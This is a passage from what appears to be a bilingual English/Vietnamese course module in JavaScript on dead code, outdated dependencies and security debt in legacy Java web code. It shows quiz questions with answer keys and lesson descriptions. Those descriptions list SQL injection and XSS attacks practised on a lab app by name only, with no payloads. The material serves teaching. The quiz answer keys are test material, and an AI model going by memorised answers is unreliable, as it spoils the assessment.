  ], 2, 'EN: Characterization tests lock behaviour; a security fix changes behaviour on purpose. Flip, document, inform.|||VI: Characterization test khoá hành vi; sửa bảo mật là đổi hành vi có chủ đích. Lật, ghi lại, báo cho người liên quan.'),
  Q('Why did the lab escape HTML with a 20-line helper instead of commons-lang 2.6 StringEscapeUtils.escapeHtml?|||Vì sao lab thoát HTML bằng hàm phụ 20 dòng thay vì StringEscapeUtils.escapeHtml của commons-lang 2.6?', [
    'escapeHtml does not escape < and >|||escapeHtml không thoát < và >',
    'escapeHtml also turns every Vietnamese letter into an entity (L&#7853;p), which would change the golden master on every page|||escapeHtml đổi luôn mọi chữ Việt thành thực thể (L&#7853;p), làm golden master đổi ở mọi trang',
    'commons-lang 2.6 has a known CVE|||commons-lang 2.6 có CVE đã biết',
    'Helpers are faster|||Hàm phụ chạy nhanh hơn',
  ], 1, 'EN: Measured, not assumed: escaping only the five significant characters kept the golden master byte-identical.|||VI: Đã đo, không phải đoán: chỉ thoát năm ký tự có nghĩa thì golden master giống hệt từng byte.'),
  Q('Which order is correct for moving plaintext passwords to PBKDF2 in production?|||Thứ tự nào đúng khi chuyển mật khẩu thô sang PBKDF2 trên production?', [
    'Deploy new login → widen column → hash the rest|||Triển khai đăng nhập mới → nới cột → băm phần còn lại',
    'Hash the rest → deploy new login → widen column|||Băm phần còn lại → triển khai đăng nhập mới → nới cột',
    'Widen the column → deploy login that accepts both forms and re-hashes → hash every remaining plaintext in one pass|||Nới cột → triển khai đăng nhập chấp nhận cả hai dạng và băm lại → băm một lượt mọi mật khẩu còn thô',
    'Force every user to reset their password|||Bắt mọi người đặt lại mật khẩu',
  ], 2, 'EN: Without the wider column the tool fails with “Data too long”; without the one-pass step, inactive accounts stay plaintext forever.|||VI: Chưa nới cột thì công cụ lỗi "Data too long"; thiếu bước băm một lượt thì tài khoản không hoạt động nằm thô mãi.'),
];
const VI_TRI = [0, 1, 2, 3, 1, 2, 0, 3, 1, 2, 1, 2];
const QUIZ6 = QUIZ6_GOC.map((q, i) => dat(q, VI_TRI[i]));

const QUIZ_CONTENT = ml((en) => `
<span class="eyebrow">${en ? 'Chapter 6 · Quiz' : 'Chương 6 · Kiểm tra'}</span>
<h2>${en ? '6.5 — Chapter 6 quiz' : '6.5 — Kiểm tra Chương 6'}</h2>
<p>${en
  ? 'Twelve questions on evidence for dead code, reading scanner output, reachability, and fixing injection and password storage without breaking users. 15 minutes. Every question comes from something that actually happened in this chapter’s lab.'
  : 'Mười hai câu về bằng chứng cho code chết, đọc kết quả máy quét, khả năng chạm tới, và sửa injection cùng cách lưu mật khẩu mà không làm vỡ người dùng. 15 phút. Câu nào cũng lấy từ chuyện đã thật sự xảy ra trong lab của chương.'}</p>
`);

export default {
  title: 'Chapter 6 — Dead code, old dependencies and security debt|||Chương 6 — Code chết, thư viện cũ và nợ bảo mật',
  lessons: [
    { title: '6.1 — Finding and removing dead code safely|||6.1 — Tìm và xoá code chết an toàn', slug: 'lgc-6-1-code-chet', type: 'LESSON', isFreePreview: true, description: 'Sáu dạng code chết trong lab; bằng chứng tĩnh (git grep, lịch sử, dependency:analyze báo nhầm JSTL và driver) và lúc chạy (access log, JaCoCo gắn vào Tomcat: ExportServlet 0/2, findById 0, nhưng cả "chết giả"); script tìm export Node với một đúng, hai báo nhầm, một bỏ sót; Knight Capital 2012; xoá trong commit riêng có bằng chứng.', content: L61 },
    { title: '6.2 — Auditing dependencies: npm audit, Maven versions plugin, OWASP Dependency-Check|||6.2 — Kiểm thư viện: npm audit, Maven versions plugin, OWASP Dependency-Check', slug: 'lgc-6-2-thu-vien-cu', type: 'LESSON', isFreePreview: true, description: 'npm audit 24 lỗ hổng production về 0 với hai lần nâng bản vá; thử khai thác qs trên chính API để xếp ưu tiên; request bị bỏ kéo 44 gói và 7 lỗ hổng; ba cái bẫy của Versions plugin; Dependency-Check chạy được trên dự án 2016 (JDK 21, cache NVD): log4j 1.x sáu CVE, Connector/J hai; Equifax 2017; Log4Shell khác log4j 1.x.', content: L62 },
    { title: '6.3 — The hacker\'s view of old code: concatenated SQL, unescaped JSP, plaintext passwords|||6.3 — Góc hacker trong code cũ: SQL nối chuỗi, JSP không thoát, mật khẩu lưu thô', slug: 'lgc-6-3-lo-hong-cu', type: 'LESSON', isFreePreview: true, description: 'Chín đòn tấn công vào chính bản lab: vượt đăng nhập, UNION, error-based, blind theo thời gian, xoá ẩn, hai loại XSS, cookie giả, mật khẩu thô; TV-102 test tấn công đỏ trước rồi PreparedStatement; CWE-209; thoát HTML giữ golden master; TV-105 PBKDF2 với nâng cấp dần, migration và băm một lượt; collation làm ADMIN123 vào được; Heartland, TalkTalk, RockYou, LinkedIn, Samy.', content: L63 },
    { title: '6.4 — Lab: Remove dead code, patch two vulnerable dependencies, fix one injection|||6.4 — Lab: Xoá code chết, vá hai thư viện có lỗ hổng, sửa một lỗi injection', slug: 'lgc-6-4-lab', type: 'LESSON', isFreePreview: true, description: 'Ticket LIB-110 trước kiểm toán: xoá có bằng chứng, reload4j thay log4j, Connector/J 9.7.0 vẫn 4 CVE nên lên 26.10.0, injection ở tìm sách và độc giả (xoá độc giả quét sạch qua cascade), golden master giống hệt; 12 commit, 33 ⇒ 49 test; lời giải dạng patch, mô tả PR mẫu, thang chấm 10 điểm.', content: L64 },
    { title: '6.5 — Chapter 6 quiz|||6.5 — Kiểm tra Chương 6', slug: 'lgc-6-5-quiz', type: 'QUIZ', isFreePreview: true, description: 'Mười hai câu: điểm vào ngoài web.xml, báo nhầm của dependency:analyze, cửa sổ đo ngắn, chức năng không có nút, khả năng chạm tới, ghim cứng phiên bản, bản cuối cùng là bản chết, Log4Shell, injection không cần dấu nháy, lật test có chủ đích, thoát HTML, thứ tự chuyển mật khẩu.', content: QUIZ_CONTENT, quiz: { timeLimitSeconds: 900, questions: QUIZ6 } },
  ],
};
